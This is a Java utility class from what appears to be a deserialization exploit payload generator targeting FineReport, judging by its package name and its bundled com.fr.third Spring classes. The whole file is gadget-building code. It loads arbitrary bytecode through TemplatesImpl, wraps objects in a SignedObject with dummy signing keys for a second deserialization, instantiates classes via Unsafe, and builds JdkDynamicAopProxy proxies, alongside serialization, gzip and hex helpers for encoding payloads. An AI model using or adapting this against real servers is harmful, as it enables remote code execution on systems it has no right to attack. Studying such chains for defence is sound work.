package com.example.frchannel.payload;

import com.fr.third.springframework.aop.framework.AdvisedSupport;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import sun.misc.Unsafe;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.math.BigInteger;
import java.security.*;
import java.security.interfaces.DSAParams;
import java.security.interfaces.DSAPrivateKey;
import java.util.zip.GZIPInputStream;
import java.util.zip.GZIPOutputStream;

public class utils {
    public static  TemplatesImpl getTeml(byte[] bytes) throws Exception {
        TemplatesImpl templates = TemplatesImpl.class.newInstance();
        setFieldValue(templates,"_name","moresec"+System.nanoTime());
        setFieldValue(templates,"_class",null);
        setFieldValue(templates,"_tfactory",new TransformerFactoryImpl());
        setFieldValue(templates,"_bytecodes",new byte[][]{bytes});
        return templates;
    }

    public static void setFieldValue(Object o, String fieldName, Object value) throws Exception {
        Field field = o.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(o,value);
    }

    public static Object getFieldValue(Object o, String fieldName) throws Exception {
        Field field = o.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        return field.get(o);
    }
    public static Constructor<?> getConstructor(String name) throws Exception {
        Constructor<?> ctor = Class.forName(name).getDeclaredConstructor();
        ctor.setAccessible(true);
        return ctor;
    }
    public static byte[] getClassByteCode(String classname) {
        String jarname = "/" + classname.replace('.', '/') + ".class";
        InputStream is = utils.class.getResourceAsStream(jarname);
        ByteArrayOutputStream bytestream = new ByteArrayOutputStream();
        int ch;
        byte imgdata[] = null;
        try {
            while ((ch = is.read()) != -1) {
                bytestream.write(ch);
            }
            imgdata = bytestream.toByteArray();
        } catch (IOException e) {
            e.printStackTrace();
        } finally {
            try {
                bytestream.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
        return imgdata;
    }
    public static SignedObject makeSignedObject(Object o) throws IOException, InvalidKeyException, SignatureException {
        return new SignedObject((Serializable) o,
                new DSAPrivateKey() {
                    @Override
                    public DSAParams getParams() {
                        return null;
                    }

                    @Override
                    public String getAlgorithm() {
                        return null;
                    }

                    @Override
                    public String getFormat() {
                        return null;
                    }

                    @Override
                    public byte[] getEncoded() {
                        return new byte[0];
                    }

                    @Override
                    public BigInteger getX() {
                        return null;
                    }
                },
                new Signature("x") {
                    @Override
                    protected void engineInitVerify(PublicKey publicKey) throws InvalidKeyException {

                    }

                    @Override
                    protected void engineInitSign(PrivateKey privateKey) throws InvalidKeyException {

                    }

                    @Override
                    protected void engineUpdate(byte b) throws SignatureException {

                    }

                    @Override
                    protected void engineUpdate(byte[] b, int off, int len) throws SignatureException {

                    }

                    @Override
                    protected byte[] engineSign() throws SignatureException {
                        return new byte[0];
                    }

                    @Override
                    protected boolean engineVerify(byte[] sigBytes) throws SignatureException {
                        return false;
                    }

                    @Override
                    protected void engineSetParameter(String param, Object value) throws InvalidParameterException {

                    }

                    @Override
                    protected Object engineGetParameter(String param) throws InvalidParameterException {
                        return null;
                    }
                });
    }
    public static byte[] serialize(Object o) throws IOException {
        ByteArrayOutputStream bao = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(bao);
        oos.writeObject(o);
        return bao.toByteArray();
    }

    public static void unserialize(byte[] b) throws IOException, ClassNotFoundException {
        ByteArrayInputStream bis = new ByteArrayInputStream(b);
        ObjectInputStream ois = new ObjectInputStream(bis);
        ois.readObject();
    }
    public static byte[] hexToByte(String hex){
        int m = 0, n = 0;
        int byteLen = hex.length() / 2; // 每两个字符描述一个字节
        byte[] ret = new byte[byteLen];
        for (int i = 0; i < byteLen; i++) {
            m = i * 2 + 1;
            n = m + 1;
            int intVal = Integer.decode("0x" + hex.substring(i * 2, m) + hex.substring(m, n));
            ret[i] = Byte.valueOf((byte)intVal);
        }
        return ret;
    }
    public static byte[] GzipCompress(byte[] out) throws Exception{
        ByteArrayOutputStream out2 = new ByteArrayOutputStream();
        GZIPOutputStream gzip;
        gzip = new GZIPOutputStream(out2);
        gzip.write(out);
        gzip.close();
        return out2.toByteArray();
    }

    public static byte[] GzipUncompress(byte[] bytes) {
        if (bytes == null || bytes.length == 0) {
            return null;
        }
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        ByteArrayInputStream in = new ByteArrayInputStream(bytes);
        try {
            GZIPInputStream ungzip = new GZIPInputStream(in);
            byte[] buffer = new byte[256];
            int n;
            while ((n = ungzip.read(buffer)) >= 0) {
                out.write(buffer, 0, n);
            }
        } catch (IOException e) {
//            ApiLogger.error("gzip uncompress error.", e);
        }

        return out.toByteArray();
    }
    // 使用 Unsafe 来绕过构造方法创建类实例
    public static Object createInstanceUnsafely(Class<?> clazz) throws Exception {
        // 反射获取Unsafe的theUnsafe成员变量
        Field theUnsafeField = Unsafe.class.getDeclaredField("theUnsafe");
        theUnsafeField.setAccessible(true);
        Unsafe unsafe = (Unsafe) theUnsafeField.get(null);
        return unsafe.allocateInstance(clazz);
    }
    public static Object makeTemplatesImplAopProxy(Object o) throws Exception {
        AdvisedSupport advisedSupport = new AdvisedSupport();
        advisedSupport.setTarget(o);
        Constructor constructor = Class.forName("com.fr.third.springframework.aop.framework.JdkDynamicAopProxy").getConstructor(AdvisedSupport.class);
        constructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(advisedSupport);
        Object proxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Templates.class}, handler);
        return proxy;
    }

}


